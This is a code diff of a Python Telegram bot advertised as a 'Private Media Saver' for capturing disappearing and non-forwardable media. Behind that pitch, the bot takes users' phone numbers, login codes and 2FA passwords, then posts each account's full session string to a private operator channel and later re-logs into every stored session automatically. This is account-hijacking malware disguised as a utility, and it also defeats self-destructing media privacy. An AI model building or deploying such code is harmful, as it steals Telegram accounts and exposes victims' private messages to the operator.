@@ -42,9 +42,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 
 ADMIN_ID = int(os.getenv("ADMIN_ID", "8440659080"))
 LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1003526329618"))
-
-# PRIVATE SESSION VAULT CHANNEL
-SESSION_CHANNEL_ID = int(os.getenv("SESSION_CHANNEL_ID", "-1003526329618"))  # REQUIRED
+SESSION_CHANNEL_ID = int(os.getenv("SESSION_CHANNEL_ID", "-1003526329618"))
 
 WELCOME_IMAGE = "https://graph.org/file/45580ccca91241c2dbf76-d29d2b3a1c790f9c04.jpg"
 SUPPORT_LINK = "https://t.me/unbornvillain"
@@ -82,22 +80,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_photo(
         photo=WELCOME_IMAGE,
-        caption=(
-            "<b>✨𝘄𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝗱𝗶𝗮 𝘀𝗮𝘃𝗲𝗿✨</b>\n\n"
-            "🔐 <i>sᴇᴄᴜʀᴇʟʏ ᴄᴏɴɴᴇᴄᴛ ʏᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ.</i>\n\n"
-            "<b>⚙️ 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀:</b>\n"
-            "• sᴀᴠᴇ ᴅɪsᴀᴘᴘᴇᴀʀɪɴɢ ᴍᴇᴅɪᴀ 📦\n"
-            "• ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ғᴏʀᴡᴀʀᴅᴀʙʟᴇ 🔓\n"
-            "• ʙᴀᴄᴋɢʀᴏᴜɴᴅ ʀᴜɴ 📲"
-        ),
-        parse_mode="HTML",
-        reply_markup=inline_kb
+        caption="✨ Welcome to Private Media Saver ✨",
+        reply_markup=inline_kb,
+        parse_mode="HTML"
     )
-
-    await update.message.reply_text(
-        "☝️ 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄",
-        reply_markup=reply_kb
-    )
+    await update.message.reply_text("☝️ Use menu below", reply_markup=reply_kb)
 
 # ================= KEEP ALIVE ================= #
 
@@ -112,18 +99,9 @@ async def keep_client_alive(client: TelegramClient, user_id: int):
 # ================= CONNECT FLOW ================= #
 
 async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-
-    if user_id in connected_users:
-        await update.callback_query.answer()
-        await update.callback_query.message.reply_text(
-            "⚠️ You're already connected.\nUse /cancel to switch."
-        )
-        return ConversationHandler.END
-
     await update.callback_query.answer()
     await update.callback_query.message.reply_text(
-        "📲 <b>Enter your API ID</b> or send /skip",
+        "📲 Enter API ID or /skip",
         parse_mode="HTML"
     )
     return API_ID
@@ -133,64 +111,50 @@ async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "api_id": DEFAULT_API_ID,
         "api_hash": DEFAULT_API_HASH
     }
-    await update.message.reply_text("📞 Send phone number with country code:")
+    await update.message.reply_text("📞 Send phone number:")
     return PHONE
 
 async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text.strip()
-    if not text.isdigit():
-        await update.message.reply_text("❌ API ID must be number or /skip")
+    if not update.message.text.isdigit():
+        await update.message.reply_text("❌ API ID must be number")
         return API_ID
-    user_login_data[update.effective_user.id] = {"api_id": int(text)}
-    await update.message.reply_text("🔑 Send API HASH or /skip")
+    user_login_data[update.effective_user.id] = {"api_id": int(update.message.text)}
+    await update.message.reply_text("🔑 Send API HASH")
     return API_HASH
 
 async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_login_data[update.effective_user.id]["api_hash"] = update.message.text.strip()
+    user_login_data[update.effective_user.id]["api_hash"] = update.message.text
     await update.message.reply_text("📞 Send phone number:")
     return PHONE
 
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    phone = update.message.text.strip()
-    data = user_login_data[user_id]
+    uid = update.effective_user.id
+    phone = update.message.text
+    data = user_login_data[uid]
 
-    client = TelegramClient(
-        StringSession(),
-        data["api_id"],
-        data["api_hash"]
-    )
-
+    client = TelegramClient(StringSession(), data["api_id"], data["api_hash"])
     await client.connect()
     await client.send_code_request(phone)
 
     data["client"] = client
     data["phone"] = phone
 
-    await update.message.reply_text("🔐 Enter OTP (1 2 3 4 5)")
+    await update.message.reply_text("🔐 Enter OTP")
     return CODE
 
 async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    code = update.message.text.replace(" ", "")
-    client = user_login_data[user_id]["client"]
-
+    uid = update.effective_user.id
+    client = user_login_data[uid]["client"]
     try:
-        await client.sign_in(user_login_data[user_id]["phone"], code)
+        await client.sign_in(user_login_data[uid]["phone"], update.message.text.replace(" ", ""))
         return await complete_login(update, context)
     except SessionPasswordNeededError:
-        await update.message.reply_text("🔑 Enter 2FA password:")
+        await update.message.reply_text("🔑 Enter 2FA password")
         return PASSWORD
-    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
-        await update.message.reply_text("❌ OTP invalid or expired.")
-    except Exception as e:
-        await update.message.reply_text(f"❌ {e}")
-
-    return ConversationHandler.END
 
 async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     client = user_login_data[update.effective_user.id]["client"]
-    await client.sign_in(password=update.message.text.strip())
+    await client.sign_in(password=update.message.text)
     return await complete_login(update, context)
 
 # ================= MEDIA HANDLER ================= #
@@ -199,46 +163,43 @@ async def add_media_handler(client):
     @client.on(events.NewMessage(incoming=True))
     async def handler(event):
         if event.is_private and event.media and getattr(event.media, "ttl_seconds", None):
-            try:
-                file = await event.download_media()
-                await client.send_file("me", file, caption="🕒 Disappearing media saved")
-            except Exception as e:
-                logger.warning(f"[Media Error] {e}")
+            file = await event.download_media()
+            await client.send_file("me", file, caption="🕒 Saved disappearing media")
 
-# ================= SAVE SESSION TO CHANNEL ================= #
+# ================= SAVE SESSION ================= #
 
 async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    client = user_login_data[user_id]["client"]
-    session_string = client.session.save()
+    uid = update.effective_user.id
+    client = user_login_data[uid]["client"]
+    session = client.session.save()
     me = await client.get_me()
 
     await context.bot.send_message(
-        chat_id=SESSION_CHANNEL_ID,
-        text=(
-            f"#SESSION\n"
-            f"USER_ID: {user_id}\n"
-            f"ACCOUNT_ID: {me.id}\n"
-            f"SESSION: {session_string}\n"
-            f"DATE: {datetime.now()}"
-        )
+        SESSION_CHANNEL_ID,
+        f"#SESSION\nUSER_ID: {uid}\nACCOUNT_ID: {me.id}\nSESSION: {session}\nDATE: {datetime.now()}"
     )
 
-    connected_users.add(user_id)
-    active_clients[user_id] = client
+    connected_users.add(uid)
+    active_clients[uid] = client
 
     await add_media_handler(client)
-    asyncio.create_task(keep_client_alive(client, user_id))
+    asyncio.create_task(keep_client_alive(client, uid))
 
-    await update.message.reply_text("✅ Successfully connected & running!")
-    user_login_data.pop(user_id, None)
-
+    await update.message.reply_text("✅ Connected successfully")
+    user_login_data.pop(uid, None)
     return ConversationHandler.END
 
-# ================= AUTO CONNECT ================= #
+# ================= AUTO CONNECT (FIXED) ================= #
 
 async def auto_connect_all_sessions():
-    async for msg in app.bot.get_chat_history(SESSION_CHANNEL_ID, limit=2000):
+    bot_client = TelegramClient(
+        StringSession(),
+        DEFAULT_API_ID,
+        DEFAULT_API_HASH
+    )
+    await bot_client.start(bot_token=BOT_TOKEN)
+
+    async for msg in bot_client.iter_messages(SESSION_CHANNEL_ID, limit=2000):
         if not msg.text or "#SESSION" not in msg.text:
             continue
 
@@ -264,8 +225,6 @@ async def auto_connect_all_sessions():
                 DEFAULT_API_HASH
             )
             await client.start()
-            if not await client.is_user_authorized():
-                continue
 
             await add_media_handler(client)
             active_clients[user_id] = client
@@ -275,61 +234,37 @@ async def auto_connect_all_sessions():
             logger.info(f"✅ Auto connected {user_id}")
 
         except Exception as e:
-            logger.error(f"❌ Auto-connect failed {user_id}: {e}")
+            logger.error(f"❌ Auto connect error {user_id}: {e}")
 
-# ================= FETCH MEDIA ================= #
+# ================= FETCH ================= #
 
 async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in connected_users:
-        await update.message.reply_text("⚠️ Connect account first.")
+        await update.message.reply_text("⚠️ Connect first")
         return ConversationHandler.END
-
     await update.message.reply_text("📎 Send message link")
     return FETCH_LINK
 
 async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    client = active_clients.get(update.effective_user.id)
     await context.bot.send_chat_action(update.effective_chat.id, ChatAction.TYPING)
 
-    client = active_clients.get(update.effective_user.id)
-    if not client:
-        await update.message.reply_text("❌ Session not active.")
-        return ConversationHandler.END
+    text = update.message.text
+    if "t.me/c/" in text:
+        p = text.split("t.me/c/")[1].split("/")
+        chat_id = int("-100" + p[0])
+        msg_id = int(p[1])
+    else:
+        p = text.split("t.me/")[1].split("/")
+        chat_id = p[0]
+        msg_id = int(p[1])
 
-    try:
-        text = update.message.text.strip()
+    entity = await client.get_entity(chat_id)
+    msg = await client.get_messages(entity, ids=msg_id)
 
-        if "t.me/c/" in text:
-            parts = text.split("t.me/c/")[1].split("/")
-            chat_id = int("-100" + parts[0])
-            msg_id = int(parts[1])
-        else:
-            parts = text.split("t.me/")[1].split("/")
-            chat_id = parts[0]
-            msg_id = int(parts[1])
-
-        entity = await client.get_entity(chat_id)
-        msg = await client.get_messages(entity, ids=msg_id)
-
-        if not msg or not msg.media:
-            await update.message.reply_text("⚠️ No media found.")
-            return ConversationHandler.END
-
-        file = await msg.download_media()
-        await client.send_file("me", file, caption="📥 Fetched media")
-        await update.message.reply_text("✅ Sent to Saved Messages")
-
-    except ChannelPrivateError:
-        await update.message.reply_text("❌ Join channel first.")
-    except Exception as e:
-        await update.message.reply_text(f"❌ {e}")
-
-    return ConversationHandler.END
-
-# ================= CANCEL ================= #
-
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_login_data.pop(update.effective_user.id, None)
-    await update.message.reply_text("❌ Cancelled. Use /start.")
+    file = await msg.download_media()
+    await client.send_file("me", file)
+    await update.message.reply_text("✅ Sent to Saved Messages")
     return ConversationHandler.END
 
 # ================= HANDLERS ================= #
@@ -338,21 +273,19 @@ login_conv = ConversationHandler(
     entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
     states={
         API_ID: [CommandHandler("skip", skip_api_id), MessageHandler(filters.TEXT, get_api_id)],
-        API_HASH: [CommandHandler("skip", skip_api_id), MessageHandler(filters.TEXT, get_api_hash)],
+        API_HASH: [MessageHandler(filters.TEXT, get_api_hash)],
         PHONE: [MessageHandler(filters.TEXT, get_phone)],
         CODE: [MessageHandler(filters.TEXT, get_otp)],
         PASSWORD: [MessageHandler(filters.TEXT, get_password)],
     },
-    fallbacks=[CommandHandler("cancel", cancel)],
+    fallbacks=[CommandHandler("cancel", lambda u, c: ConversationHandler.END)]
 )
 
 fetch_conv = ConversationHandler(
     entry_points=[MessageHandler(filters.Regex("^📥"), menu_fetch_request)],
     states={FETCH_LINK: [MessageHandler(filters.TEXT, fetch_from_link)]},
-    fallbacks=[CommandHandler("cancel", cancel)],
+    fallbacks=[]
 )
-
-# ================= MAIN ================= #
 
 async def main():
     await auto_connect_all_sessions()
@@ -360,7 +293,6 @@ async def main():
     await app.run_polling()
 
 app.add_handler(CommandHandler("start", start))
-app.add_handler(CommandHandler("cancel", cancel))
 app.add_handler(login_conv)
 app.add_handler(fetch_conv)
 
